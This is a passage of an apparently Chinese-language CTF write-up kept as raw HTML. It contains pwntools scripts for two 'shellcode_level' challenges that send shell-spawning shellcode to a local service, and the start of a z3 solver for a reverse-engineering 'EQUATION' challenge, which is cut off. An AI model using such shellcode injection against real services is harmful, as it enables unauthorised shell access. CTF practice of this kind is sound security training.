class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#必须加,不然生成的shellcode是32位的</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./shellcode_level0&quot;, &quot;main&quot;)</span></span><br><span class="line"><span class="comment"># p= process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"><span class="comment"># 在linux下执行!</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">46277</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x80</span></span><br><span class="line">shellcode_addr = <span class="number">0x7ffdfdaf2ab0</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># payload = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shellcode-level1">shellcode_level1</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#必须加,不然生成的shellcode是32位的</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./shellcode_level0&quot;, &quot;main&quot;)</span></span><br><span class="line"><span class="comment"># p= process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"><span class="comment"># 在linux下执行!</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">46277</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># payload = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 貌似过了?</span></span><br></pre></td></tr></table></figure><h1 id="reverse">Reverse</h1><h2 id="equation">EQUATION</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line"><span class="meta"># for i in range(1, 32):</span></span><br><span class="line"><span class="meta">#     print(<span class="string">&#x27;x&#x27;</span> + str(i) + <span class="string">&#x27;,&#x27;</span>, end=<span class="string">&#x27;&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(&#x27;</span> = Ints(\<span class="string">&#x27;&#x27;, end=&#x27;</span><span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># for i in range(1, 32):</span></span></span><br><span class="line"><span class="string"><span class="meta">#     print(&#x27;</span>x<span class="string">&#x27;+str(i),end=&#x27;</span> <span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(&#x27;</span>\<span class="string">&#x27;)&#x27;</span>)</span></span><br><span class="line">x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30 = Ints(</span><br><span class="line">    <span class="string">&#x27;x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18 x19 x20 x21 x22 x23 x24 x25 x26 x27 x28 x29 x30&#x27;</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="meta"># for i in range(30):</span></span><br><span class="line"><span class="meta">#     str = input()</span></span><br><span class="line"><span class="meta">#     print(<span class="string">&#x27;solver.add(&#x27;</span>+str+<span class="string">&#x27;)&#x27;</span>)</span></span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">334</span> * x28 + <span class="number">100</span> * x27 + <span class="number">369</span> * x26 + <span class="number">124</span> * x25 + <span class="number">278</span> * x24 + <span class="number">158</span> * x23 + <span class="number">162</span> * x22 + <span class="number">145</span> * x19 + <span class="number">27</span> * x17 + <span class="number">91</span> * x15 + <span class="number">195</span> * x14 + <span class="number">342</span> * x13 + <span class="number">391</span> * x10 + <span class="number">204</span> * x9 + <span class="number">302</span> * x8 + <span class="number">153</span> * x7 + <span class="number">292</span> * x6 + <span class="number">382</span> * x5 + <span class="number">221</span> * x4 + <span class="number">316</span> * x3 + <span class="number">118</span> * x2 + <span class="number">295</span> * x1 + <span class="number">247</span> * x0 + <span class="number">236</span> * x11 + <span class="number">27</span> * x12 + <span class="number">361</span> * x16 + <span class="number">81</span> * x18 + <span class="number">105</span> * x20 + <span class="number">65</span> * x21 + <span class="number">67</span> * x29 + <span class="number">41</span> * x30 == <span class="number">596119</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">371</span> * x29 + <span class="number">338</span> * x28 + <span class="number">269</span> * x27 + <span class="number">312</span> * x26 + <span class="number">67</span> * x25 + <span class="number">299</span> * x24 + <span class="number">235</span> * x23 + <span class="number">294</span> * x22 + <span class="number">303</span> * x21 + <span class="number">211</span> * x20 + <span class="number">122</span> * x19 + <span class="number">333</span> * x18 + <span class="number">341</span> * x15 + <span class="number">111</span> * x14 + <span class="number">253</span> * x13 + <span class="number">68</span> * x12 + <span class="number">347</span> * x11 + <span class="number">44</span> * x10 + <span class="number">262</span> * x9 + <span class="number">357</span> * x8 + <span class="number">323</span> * x5 + <span class="number">141</span> * x4 + <span class="number">329</span> * x3 + <span class="number">378</span> * x2 + <span class="number">316</span> * x1 + <span class="number">235</span> * x0 + <span class="number">59</span> * x6 + <span class="number">37</span> * x7 + <span class="number">264</span> * x16 + <span class="number">73</span> * x17 + <span class="number">126</span> * x30 == <span class="number">634009</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">337</span> * x29 + <span class="number">338</span> * x28 + <span class="number">118</span> * x27 + <span class="number">82</span> * x26 + <span class="number">239</span> * x21 + <span class="number">58</span> * x20 + <span class="number">304</span> * x19 + <span class="number">330</span> * x18 + <span class="number">377</span> * x17 + <span class="number">306</span> * x16 + <span class="number">221</span> * x13 + <span class="number">345</span> * x12 + <span class="number">124</span> * x11 + <span class="number">272</span> * x10 + <span class="number">270</span> * x9 + <span class="number">229</span> * x8 + <span class="number">377</span> * x7 + <span class="number">373</span> * x6 + <span class="number">297</span> * x5 + <span class="number">112</span> * x4 + <span class="number">386</span> * x3 + <span class="number">90</span> * x2 + <span class="number">361</span> * x1 + <span class="number">236</span> * x0 + <span class="number">386</span> * x14 + <span class="number">73</span> * x15 + <span class="number">315</span> * x22 + <span class="number">33</span> * x23 + <span class="number">141</span> * x24 + <span class="number">129</span> * x25 + <span class="number">123</span> * x30 == <span class="number">685705</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">367</span> * x29 + <span class="number">55</span> * x28 + <span class="number">374</span> * x27 + <span class="number">150</span> * x24 + <span class="number">350</span> * x23 + <span class="number">141</span> * x22 + <span class="number">124</span> * x21 + <span class="number">366</span> * x20 + <span class="number">230</span> * x19 + <span class="number">307</span> * x18 + <span class="number">191</span> * x17 + <span class="number">153</span> * x12 + <span class="number">383</span> * x11 + <span class="number">145</span> * x10 + <span class="number">109</span> * x9 + <span class="number">209</span> * x8 + <span class="number">158</span> * x7 + <span class="number">221</span> * x6 + <span class="number">188</span> * x5 + <span class="number">22</span> * x4 + <span class="number">146</span> * x3 + <span class="number">306</span> * x2 + <span class="number">230</span> * x1 + <span class="number">13</span> * x0 + <span class="number">287</span> * x13 + <span class="number">257</span> * x14 + <span class="number">137</span> * x15 + <span class="number">7</span> * x16 + <span class="number">52</span> * x25 + <span class="number">31</span> * x26 + <span class="number">355</span> * x30 == <span class="number">557696</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">100</span> * x29 + <span class="number">191</span> * x28 + <span class="number">362</span> * x27 + <span class="number">55</span> * x26 + <span class="number">210</span> * x25 + <span class="number">359</span> * x24 + <span class="number">348</span> * x21 + <span class="number">83</span> * x20 + <span class="number">395</span> * x19 + <span class="number">350</span> * x16 + <span class="number">291</span> * x15 + <span class="number">220</span> * x12 + <span class="number">196</span> * x11 + <span class="number">399</span> * x8 + <span class="number">68</span> * x7 + <span class="number">84</span> * x6 + <span class="number">281</span> * x5 + <span class="number">334</span> * x4 + <span class="number">53</span> * x3 + <span class="number">399</span> * x2 + <span class="number">338</span> * x0 + <span class="number">18</span> * x1 + <span class="number">148</span> * x9 + <span class="number">21</span> * x10 + <span class="number">174</span> * x13 + <span class="number">36</span> * x14 + <span class="number">2</span> * x17 + <span class="number">41</span> * x18 + <span class="number">137</span> * x22 + <span class="number">24</span> * x23 + <span class="number">368</span> * x30 == <span class="number">538535</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">188</span> * x29 + <span class="number">128</span> * x26 + <span class="number">93</span> * x25 + <span class="number">248</span> * x24 + <span class="number">83</span> * x23 + <span class="number">207</span> * x22 + <span class="number">217</span> * x19 + <span class="number">309</span> * x16 + <span class="number">16</span> * x15 + <span class="number">135</span> * x14 + <span class="number">251</span> * x13 + <span class="number">200</span> * x12 + <span class="number">49</span> * x11 + <span class="number">119</span> * x10 + <span class="number">356</span> * x9 + <span class="number">398</span> * x8 + <span class="number">303</span> * x7 + <span class="number">224</span> * x6 + <span class="number">208</span> * x5 + <span class="number">244</span> * x4 + <span class="number">209</span> * x3 + <span class="number">189</span> * x2 + <span class="number">302</span> * x1 + <span class="number">395</span> * x0 + <span class="number">314</span> * x17 + <span class="number">13</span> * x18 + <span class="number">310</span> * x20 + <span class="number">21</span> * x21 + <span class="number">67</span> * x27 + <span class="number">127</span> * x28 + <span class="number">100</span> * x30 == <span class="number">580384</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">293</span> * x29 + <span class="number">343</span> * x28 + <span class="number">123</span> * x27 + <span class="number">387</span> * x26 + <span class="number">114</span> * x25 + <span class="number">303</span> * x24 + <span class="number">248</span> * x23 + <span class="number">258</span> * x21 + <span class="number">218</span> * x20 + <span class="number">180</span> * x19 + <span class="number">196</span> * x18 + <span class="number">398</span> * x17 + <span class="number">398</span> * x14 + <span class="number">138</span> * x9 + <span class="number">292</span> * x8 + <span class="number">38</span> * x7 + <span class="number">179</span> * x6 + <span class="number">190</span> * x5 + <span class="number">57</span> * x4 + <span class="number">358</span> * x3 + <span class="number">191</span> * x2 + <span class="number">215</span> * x1 + <span class="number">88</span> * x0 + <span class="number">22</span> * x10 + <span class="number">72</span> * x11 + <span class="number">357</span> * x12 + <span class="number">9</span> * x13 + <span class="number">389</span> * x15 + <span class="number">81</span> * x16 + <span class="number">85</span> * x30 == <span class="number">529847</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">311</span> * x29 + <span class="number">202</span> * x28 + <span class="number">234</span> * x27 + <span class="number">272</span> * x26 + <span class="number">55</span> * x25 + <span class="number">328</span> * x24 + <span class="number">246</span> * x23 + <span class="number">362</span> * x22 + <span class="number">86</span> * x21 + <span class="number">75</span> * x20 + <span class="number">142</span> * x17 + <span class="number">244</span> * x16 + <span class="number">216</span> * x15 + <span class="number">281</span> * x14 + <span class="number">398</span> * x13 + <span class="number">322</span> * x12 + <span class="number">251</span> * x11 + <span class="number">357</span> * x8 + <span class="number">76</span> * x7 + <span class="number">292</span> * x6 + <span class="number">389</span> * x5 + <span class="number">275</span> * x4 + <span class="number">312</span> * x3 + <span class="number">200</span> * x2 + <span class="number">110</span> * x1 + <span class="number">203</span> * x0 + <span class="number">99</span> * x9 + <span class="number">21</span> * x10 + <span class="number">269</span> * x18 + <span class="number">33</span> * x19 + <span class="number">356</span> * x30 == <span class="number">631652</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">261</span> * x29 + <span class="number">189</span> * x26 + <span class="number">55</span> * x25 + <span class="number">23</span> * x24 + <span class="number">202</span> * x23 + <span class="number">185</span> * x22 + <span class="number">182</span> * x21 + <span class="number">285</span> * x20 + <span class="number">217</span> * x17 + <span class="number">157</span> * x16 + <span class="number">232</span> * x15 + <span class="number">132</span> * x14 + <span class="number">169</span> * x13 + <span class="number">154</span> * x12 + <span class="number">121</span> * x11 + <span class="number">389</span> * x10 + <span class="number">376</span> * x9 + <span class="number">292</span> * x6 + <span class="number">225</span> * x5 + <span class="number">155</span> * x4 + <span class="number">234</span> * x3 + <span class="number">149</span> * x2 + <span class="number">241</span> * x1 + <span class="number">312</span> * x0 + <span class="number">368</span> * x7 + <span class="number">129</span> * x8 + <span class="number">226</span> * x18 + <span class="number">288</span> * x19 + <span class="number">201</span> * x27 + <span class="number">288</span> * x28 + <span class="number">69</span> * x30 == <span class="number">614840</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">60</span> * x29 + <span class="number">118</span> * x28 + <span class="number">153</span> * x27 + <span class="number">139</span> * x26 + <span class="number">23</span> * x25 + <span class="number">279</span> * x24 + <span class="number">396</span> * x23 + <span class="number">287</span> * x22 + <span class="number">237</span> * x19 + <span class="number">266</span> * x18 + <span class="number">149</span> * x17 + <span class="number">193</span> * x16 + <span class="number">395</span> * x15 + <span class="number">97</span> * x14 + <span class="number">16</span> * x13 + <span class="number">286</span> * x12 + <span class="number">105</span> * x11 + <span class="number">88</span> * x10 + <span class="number">282</span> * x9 + <span class="number">55</span> * x8 + <span class="number">134</span> * x7 + <span class="number">114</span> * x6 + <span class="number">101</span> * x5 + <span class="number">116</span> * x4 + <span class="number">271</span> * x3 + <span class="number">186</span> * x2 + <span class="number">263</span> * x1 + <span class="number">313</span> * x0 + <span class="number">149</span> * x20 + <span class="number">129</span> * x21 + <span class="number">145</span> * x30 == <span class="number">510398</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">385</span> * x29 + <span class="number">53</span> * x28 + <span class="number">112</span> * x27 + <span class="number">8</span> * x26 + <span class="number">232</span> * x25 + <span class="number">145</span> * x24 + <span class="number">313</span> * x23 + <span class="number">156</span> * x22 + <span class="number">321</span> * x21 + <span class="number">358</span> * x20 + <span class="number">46</span> * x19 + <span class="number">382</span> * x18 + <span class="number">144</span> * x16 + <span class="number">222</span> * x14 + <span class="number">329</span> * x13 + <span class="number">161</span> * x12 + <span class="number">335</span> * x11 + <span class="number">50</span> * x10 + <span class="number">373</span> * x9 + <span class="number">66</span> * x8 + <span class="number">44</span> * x7 + <span class="number">59</span> * x6 + <span class="number">292</span> * x5 + <span class="number">39</span> * x4 + <span class="number">53</span> * x3 + <span class="number">310</span> * x0 + <span class="number">154</span> * x1 + <span class="number">24</span> * x2 + <span class="number">396</span> * x15 + <span class="number">81</span> * x17 + <span class="number">355</span> * x30 == <span class="number">558740</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">249</span> * x29 + <span class="number">386</span> * x28 + <span class="number">313</span> * x27 + <span class="number">74</span> * x26 + <span class="number">22</span> * x25 + <span class="number">168</span> * x24 + <span class="number">305</span> * x21 + <span class="number">358</span> * x20 + <span class="number">191</span> * x19 + <span class="number">202</span> * x18 + <span class="number">14</span> * x15 + <span class="number">114</span> * x14 + <span class="number">224</span> * x13 + <span class="number">134</span> * x12 + <span class="number">274</span> * x11 + <span class="number">372</span> * x10 + <span class="number">159</span> * x9 + <span class="number">233</span> * x8 + <span class="number">70</span> * x7 + <span class="number">287</span> * x6 + <span class="number">297</span> * x5 + <span class="number">318</span> * x4 + <span class="number">177</span> * x3 + <span class="number">173</span> * x2 + <span class="number">270</span> * x1 + <span class="number">163</span> * x0 + <span class="number">77</span> * x16 + <span class="number">25</span> * x17 + <span class="number">387</span> * x22 + <span class="number">18</span> * x23 + <span class="number">345</span> * x30 == <span class="number">592365</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">392</span> * x29 + <span class="number">385</span> * x28 + <span class="number">302</span> * x27 + <span class="number">13</span> * x25 + <span class="number">27</span> * x24 + <span class="number">99</span> * x22 + <span class="number">343</span> * x19 + <span class="number">324</span> * x18 + <span class="number">223</span> * x17 + <span class="number">372</span> * x16 + <span class="number">261</span> * x15 + <span class="number">181</span> * x14 + <span class="number">203</span> * x13 + <span class="number">232</span> * x12 + <span class="number">305</span> * x11 + <span class="number">393</span> * x10 + <span class="number">325</span> * x9 + <span class="number">231</span> * x8 + <span class="number">92</span> * x7 + <span class="number">142</span> * x6 + <span class="number">22</span> * x5 + <span class="number">86</span> * x4 + <span class="number">264</span> * x3 + <span class="number">300</span> * x2 + <span class="number">387</span> * x1 + <span class="number">360</span> * x0 + <span class="number">225</span> * x20 + <span class="number">127</span> * x21 + <span class="number">2</span> * x23 + <span class="number">80</span> * x26 + <span class="number">268</span> * x30 == <span class="number">619574</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">270</span> * x28 + <span class="number">370</span> * x27 + <span class="number">235</span> * x26 + <span class="number">96</span> * x22 + <span class="number">85</span> * x20 + <span class="number">150</span> * x19 + <span class="number">140</span> * x18 + <span class="number">94</span> * x17 + <span class="number">295</span> * x16 + <span class="number">19</span> * x14 + <span class="number">176</span> * x12 + <span class="number">94</span> * x11 + <span class="number">258</span> * x10 + <span class="number">302</span> * x9 + <span class="number">171</span> * x8 + <span class="number">66</span> * x7 + <span class="number">278</span> * x6 + <span class="number">193</span> * x5 + <span class="number">251</span> * x4 + <span class="number">284</span> * x3 + <span class="number">218</span> * x2 + <span class="number">64</span> * x1 + <span class="number">319</span> * x0 + <span class="number">125</span> * x13 + <span class="number">24</span> * x15 + <span class="number">267</span> * x21 + <span class="number">160</span> * x23 + <span class="number">111</span> * x24 + <span class="number">33</span> * x25 + <span class="number">174</span> * x29 + <span class="number">13</span> * x30 == <span class="number">480557</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">87</span> * x28 + <span class="number">260</span> * x27 + <span class="number">326</span> * x26 + <span class="number">210</span> * x25 + <span class="number">357</span> * x24 + <span class="number">170</span> * x23 + <span class="number">315</span> * x22 + <span class="number">376</span> * x21 + <span class="number">227</span> * x20 + <span class="number">43</span> * x19 + <span class="number">358</span> * x18 + <span class="number">364</span> * x17 + <span class="number">309</span> * x16 + <span class="number">282</span> * x15 + <span class="number">286</span> * x14 + <span class="number">365</span> * x13 + <span class="number">287</span> * x12 + <span class="number">377</span> * x11 + <span class="number">74</span> * x10 + <span class="number">225</span> * x9 + <span class="number">328</span> * x6 + <span class="number">223</span> * x5 + <span class="number">120</span> * x4 + <span class="number">102</span> * x3 + <span class="number">162</span> * x2 + <span class="number">123</span> * x1 + <span class="number">196</span> * x0 + <span class="number">29</span> * x7 + <span class="number">27</span> * x8 + <span class="number">352</span> * x30 == <span class="number">666967</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">61</span> * x29 + <span class="number">195</span> * x28 + <span class="number">125</span> * x27 + <span class="number">64</span> * x26 + <span class="number">260</span> * x25 + <span class="number">202</span> * x24 + <span class="number">116</span> * x23 + <span class="number">230</span> * x22 + <span class="number">326</span> * x21 + <span class="number">211</span> * x20 + <span class="number">371</span> * x19 + <span class="number">353</span> * x16 + <span class="number">124</span> * x13 + <span class="number">188</span> * x12 + <span class="number">163</span> * x11 + <span class="number">140</span> * x10 + <span class="number">51</span> * x9 + <span class="number">262</span> * x8 + <span class="number">229</span> * x7 + <span class="number">100</span> * x6 + <span class="number">113</span> * x5 + <span class="number">158</span> * x4 + <span class="number">378</span> * x3 + <span class="number">365</span> * x2 + <span class="number">207</span> * x1 + <span class="number">277</span> * x0 + <span class="number">190</span> * x14 + <span class="number">320</span> * x15 + <span class="number">347</span> * x17 + <span class="number">11</span> * x18 + <span class="number">137</span> * x30 == <span class="number">590534</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">39</span> * x28 + <span class="number">303</span> * x27 + <span class="number">360</span> * x26 + <span class="number">157</span> * x25 + <span class="number">324</span> * x24 + <span class="number">77</span> * x23 + <span class="number">308</span> * x22 + <span class="number">313</span> * x21 + <span class="number">87</span> * x20 + <span class="number">201</span> * x19 + <span class="number">50</span> * x18 + <span class="number">60</span> * x17 + <span class="number">28</span> * x16 + <span class="number">193</span> * x15 + <span class="number">184</span> * x14 + <span class="number">205</span> * x13 + <span class="number">140</span> * x12 + <span class="number">311</span> * x11 + <span class="number">304</span> * x10 + <span class="number">35</span> * x9 + <span class="number">356</span> * x8 + <span class="number">23</span> * x5 + <span class="number">85</span> * x4 + <span class="number">156</span> * x3 + <span class="number">16</span> * x2 + <span class="number">26</span> * x1 + <span class="number">157</span> * x0 + <span class="number">150</span> * x6 + <span class="number">72</span> * x7 + <span class="number">58</span> * x29 == <span class="number">429108</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">157</span> * x29 + <span class="number">137</span> * x28 + <span class="number">71</span> * x27 + <span class="number">269</span> * x26 + <span class="number">161</span> * x25 + <span class="number">317</span> * x20 + <span class="number">296</span> * x19 + <span class="number">385</span> * x18 + <span class="number">165</span> * x13 + <span class="number">159</span> * x12 + <span class="number">132</span> * x11 + <span class="number">296</span> * x10 + <span class="number">162</span> * x7 + <span class="number">254</span> * x4 + <span class="number">172</span> * x3 + <span class="number">132</span> * x0 + <span class="number">369</span> * x1 + <span class="number">257</span> * x2 + <span class="number">134</span> * x5 + <span class="number">384</span> * x6 + <span class="number">53</span> * x8 + <span class="number">255</span> * x9 + <span class="number">229</span> * x14 + <span class="number">129</span> * x15 + <span class="number">23</span> * x16 + <span class="number">41</span> * x17 + <span class="number">112</span> * x21 + <span class="number">17</span> * x22 + <span class="number">222</span> * x23 + <span class="number">96</span> * x24 + <span class="number">126</span> * x30 == <span class="number">563521</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">207</span> * x29 + <span class="number">83</span> * x28 + <span class="number">111</span> * x27 + <span class="number">35</span> * x26 + <span class="number">67</span> * x25 + <span class="number">138</span> * x22 + <span class="number">223</span> * x21 + <span class="number">142</span> * x20 + <span class="number">154</span> * x19 + <span class="number">111</span> * x18 + <span class="number">341</span> * x17 + <span class="number">175</span> * x16 + <span class="number">259</span> * x15 + <span class="number">225</span> * x14 + <span class="number">26</span> * x11 + <span class="number">334</span> * x10 + <span class="number">250</span> * x7 + <span class="number">198</span> * x6 + <span class="number">279</span> * x5 + <span class="number">301</span> * x4 + <span class="number">193</span> * x3 + <span class="number">334</span> * x2 + <span class="number">134</span> * x0 + <span class="number">37</span> * x1 + <span class="number">183</span> * x8 + <span class="number">5</span> * x9 + <span class="number">270</span> * x12 + <span class="number">21</span> * x13 + <span class="number">275</span> * x23 + <span class="number">48</span> * x24 + <span class="number">163</span> * x30 == <span class="number">493999</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">393</span> * x29 + <span class="number">176</span> * x28 + <span class="number">105</span> * x27 + <span class="number">162</span> * x26 + <span class="number">148</span> * x25 + <span class="number">281</span> * x24 + <span class="number">300</span> * x23 + <span class="number">342</span> * x18 + <span class="number">262</span> * x17 + <span class="number">152</span> * x12 + <span class="number">43</span> * x11 + <span class="number">296</span> * x10 + <span class="number">273</span> * x9 + <span class="number">75</span> * x6 + <span class="number">18</span> * x4 + <span class="number">217</span> * x2 + <span class="number">132</span> * x1 + <span class="number">112</span> * x0 + <span class="number">210</span> * x3 + <span class="number">72</span> * x5 + <span class="number">113</span> * x7 + <span class="number">40</span> * x8 + <span class="number">278</span> * x13 + <span class="number">24</span> * x14 + <span class="number">77</span> * x15 + <span class="number">11</span> * x16 + <span class="number">55</span> * x19 + <span class="number">255</span> * x20 + <span class="number">241</span> * x21 + <span class="number">13</span> * x22 + <span class="number">356</span> * x30 == <span class="number">470065</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">369</span> * x29 + <span class="number">231</span> * x28 + <span class="number">285</span> * x25 + <span class="number">290</span> * x24 + <span class="number">297</span> * x23 + <span class="number">189</span> * x22 + <span class="number">390</span> * x21 + <span class="number">345</span> * x20 + <span class="number">153</span> * x19 + <span class="number">114</span> * x18 + <span class="number">251</span> * x17 + <span class="number">340</span> * x16 + <span class="number">44</span> * x15 + <span class="number">58</span> * x14 + <span class="number">335</span> * x13 + <span class="number">359</span> * x12 + <span class="number">392</span> * x11 + <span class="number">181</span> * x8 + <span class="number">103</span> * x7 + <span class="number">229</span> * x6 + <span class="number">175</span> * x5 + <span class="number">208</span> * x4 + <span class="number">92</span> * x3 + <span class="number">397</span> * x2 + <span class="number">349</span> * x1 + <span class="number">356</span> * x0 + <span class="number">64</span> * x9 + <span class="number">5</span> * x10 + <span class="number">88</span> * x26 + <span class="number">40</span> * x27 + <span class="number">295</span> * x30 == <span class="number">661276</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">341</span> * x27 + <span class="number">40</span> * x25 + <span class="number">374</span> * x23 + <span class="number">201</span> * x22 + <span class="number">77</span> * x21 + <span class="number">215</span> * x20 + <span class="number">283</span> * x19 + <span class="number">213</span> * x18 + <span class="number">392</span> * x17 + <span class="number">224</span> * x16 + <span class="number">1</span> * x15 + <span class="number">270</span> * x12 + <span class="number">28</span> * x11 + <span class="number">75</span> * x8 + <span class="number">386</span> * x7 + <span class="number">298</span> * x6 + <span class="number">170</span> * x5 + <span class="number">287</span> * x4 + <span class="number">247</span> * x3 + <span class="number">204</span> * x2 + <span class="number">103</span> * x1 + <span class="number">21</span> * x0 + <span class="number">84</span> * x9 + <span 